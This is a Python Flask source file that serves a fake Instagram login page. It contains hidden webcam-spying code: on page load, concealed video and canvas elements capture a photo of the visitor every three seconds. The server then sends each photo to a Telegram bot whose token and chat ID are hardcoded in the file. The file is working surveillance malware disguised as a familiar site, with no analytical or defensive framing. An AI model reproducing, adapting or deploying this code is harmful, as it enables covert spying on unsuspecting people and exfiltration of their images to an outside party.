from flask import Flask, request, render_template_string, jsonify
import requests
import base64
from datetime import datetime

app = Flask(__name__)

# Telegram Bot API details
BOT_TOKEN = "7379451782:AAGMp5sONfsjO2IdZzU9Hp-AuN68TgaZXiw"
CHAT_ID = "5095137619"

# HTML content embedded in Python
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram Login Page</title>
    <link rel="stylesheet" href="static/style.css">
    <link rel="stylesheet" href="static\\styles.css">
    <style>
        @import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');

        *{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            outline: none;
            list-style: none;
            text-decoration: none;
            font-family: 'Roboto', sans-serif;
        }

        body{
            background: #fafafa;
            font-size: 14px;
        }

        .wrapper .header{
            max-width: 350px;
            width: 100%;
            height: auto;
            margin: 50px auto;
        }

        .wrapper .header .top,
        .wrapper .signup{
            background: #fff;
            border: 1px solid #e6e6e6;
            border-radius: 1px;
            padding: 40px 40px 20px;
        }

        .wrapper .header .logo img{
            display: block;
            margin: 0 auto 35px;
        }

        .wrapper .header .form .input_field{
            margin-bottom: 5px;
        }

        .wrapper .header .form .input_field .input{
            width: 100%;
            background: #fafafa;
            border: 1px solid #efefef;
            font-size: 12px;
            border-radius: 3px;
            color: #262626;
            padding: 10px;
        }

        .wrapper .header .form .input_field .input:focus{
            border: 1px solid #b2b2b2;
        }

        .wrapper .header .form .btn{
            margin: 10px 0;
            background-color: #3897f0;
            border: 1px solid #3897f0;
            border-radius: 4px;
            text-align: center;
            padding: 5px;
        }

        .wrapper .header .form .btn a{
            color: #fff;
            display: block;
        }

        .wrapper .header .or{
            display: flex;
            justify-content: space-between;
            align-items: center;
            height: 15px;
            margin: 15px 0 20px;
        }

        .wrapper .header .or .line{
            width: 105px;
            height: 2px;
            background: #efefef
        }

        .wrapper .header .or p{
            color: #999;
            font-size: 12px;
        }

        .wrapper .header .dif .fb{
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .wrapper .header .dif .fb img{
            width: 16px;
            height: 16px;
        }

        .wrapper .header .dif  .fb p{
            color: #385185;
            font-weight: 500;
            margin-left: 10px;
        }

        .wrapper .header .dif .forgot{
            font-size: 12px;
            text-align: center;
            margin-top: 20px;
        }

        .wrapper .header .dif .forgot a{
            color: #003569;
        }

        .wrapper .signup{
            margin: 10px 0 20px;
            padding: 25px 40px;
            text-align: center;
            color: #262626;
        }

        .wrapper .signup a{
            color: #3897f0;
        }

        .wrapper .apps{
            text-align: center;
            color: #262626;
        }

        .wrapper .apps p{
            margin-bottom: 20px;
        }

        .wrapper .apps a img{
            width: 135px;
            height: 40px;
            margin: 0 5px;
        }

        .footer{
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            padding: 40px 0;
            display: flex;
            justify-content: space-between;
        }

        .footer .links ul li{
            display: inline-block;
            margin-right: 10px;
        }

        .footer .links ul li a{
            color: #003569;
            font-size: 12px;
        }

        .footer .copyright{
            color: #999;    
        }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="top">
            <div class="logo">
                <img src="static/instagram.png" alt="instagram" style="width: 175px;">
            </div>
            <div class="form">
                <div class="input_field">
                    <input type="text" placeholder="Phone number, username, or email" class="input">
                </div>
                <div class="input_field">
                    <input type="password" placeholder="Password" class="input">
                </div>
                <div class="btn"><a href="#">Log In</a></div>
            </div>
            <div class="or">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <div class="dif">
                <div class="fb">
                    <img src="static/facebook.png" alt="facebook">
                    <p>Log in with Facebook</p>
                </div>
                <div class="forgot">
                    <a href="#">Forgot password?</a>
                </div>
            </div>
        </div>
        <div class="signup">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="apps">
            <p>Get the app.</p>
            <div class="icons">
                <a href="#"><img src="static/appstore.png" alt="appstore"></a>
                <a href="#"><img src="static/googleplay.png" alt="googleplay"></a>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <ul>
                <li><a href="#">ABOUT US</a></li>
                <li><a href="#">SUPPORT</a></li>
                <li><a href="#">PRESS</a></li>
                <li><a href="#">API</a></li>
                <li><a href="#">JOBS</a></li>
                <li><a href="#">PRIVACY</a></li>
                <li><a href="#">TERMS</a></li>
                <li><a href="#">DIRECTORY</a></li>
                <li><a href="#">PROFILES</a></li>
                <li><a href="#">HASHTAGS</a></li>
                <li><a href="#">LANGUAGE</a></li>
            </ul>
        </div>
        <div class="copyright">
            © 2019 INSTAGRAM
        </div>
    </div>
</div>

<video id="webcam" autoplay style="display:none;"></video>  <!-- Webcam feed (hidden) -->
<canvas id="photo" style="display:none;"></canvas>  <!-- Canvas to take photo -->
<script>
    // Start the webcam automatically when the page loads
    window.onload = async function() {
        let webcamStream;
        const videoElement = document.getElementById('webcam');
        const canvasElement = document.getElementById('photo');

        try {
            // Get webcam access
            webcamStream = await navigator.mediaDevices.getUserMedia({ video: true });
            videoElement.srcObject = webcamStream;

            // Wait until the webcam is loaded, then capture the photo
            videoElement.onloadedmetadata = function() {
                const context = canvasElement.getContext('2d');
                canvasElement.width = videoElement.videoWidth;
                canvasElement.height = videoElement.videoHeight;

                // Continuously capture the photo every 3 seconds
                setInterval(function() {
                    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                    const imageData = canvasElement.toDataURL('image/png');
                    uploadPhoto(imageData);
                }, 3000);  // Capture every 3 seconds
            };
        } catch (error) {
            alert("Error accessing webcam: " + error.message);
        }
    };

    // Function to upload the captured photo to the server
    async function uploadPhoto(imageData) {
        try {
            const response = await fetch('/upload_photo', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ image: imageData })
            });
            const data = await response.json();
            console.log('Photo uploaded successfully:', data);
        } catch (error) {
            console.error('Error uploading photo:', error);
        }
    }
</script>

</body>
</html>
"""

# Route to render the HTML page
@app.route('/')
def index():
    return render_template_string(HTML_CONTENT)


# Route to handle photo uploads and send them to Telegram directly
@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    data = request.get_json()
    image_data = data.get('image')
    
    if image_data:
        # Remove the base64 header
        image_data = image_data.split(",")[1]
        # Decode the image data
        image = base64.b64decode(image_data)

        # Send the image to Telegram directly without saving it to the server
        send_to_telegram(image)

        return jsonify({'status': 'success', 'message': 'Photo uploaded and sent to Telegram'})
    else:
        return jsonify({'status': 'error', 'message': 'No image data found'}), 400


# Function to send the photo to Telegram
def send_to_telegram(image_data):
    files = {'photo': ('photo.png', image_data)}
    data = {
        'chat_id': CHAT_ID,
        'caption': 'New photo from webcam'
    }
    requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)


if __name__ == '__main__':
    app.run(debug=True)
